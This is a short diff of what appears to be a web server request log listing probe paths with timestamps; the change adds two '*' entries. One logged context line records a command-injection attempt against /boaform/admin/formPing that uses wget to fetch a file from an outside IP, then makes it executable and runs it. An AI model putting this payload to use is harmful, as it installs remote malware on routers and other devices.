@@ -2281,4 +2281,6 @@
   /mysql-admin/ , Sun Aug 09 2020 00:14:52 GMT-0300 (GMT-03:00) 
   /boaform/admin/formLogin , Wed Aug 12 2020 16:20:35 GMT-0300 (GMT-03:00) 
   /boaform/admin/formPing?target_addr=;wget%20http://185.172.110.185/netlink%20-O%20/tmp/jno;chmod%20777%20/tmp/jno;sh%20/tmp/jno%27/&waninf=1_INTERNET_R_VID_154$ , Wed Aug 12 2020 16:27:50 GMT-0300 (GMT-03:00) 
+  * , Sat Oct 29 2022 17:51:57 GMT+0000 (Coordinated Universal Time) 
+  * , Sat Oct 29 2022 18:52:14 GMT+0000 (Coordinated Universal Time) 
  
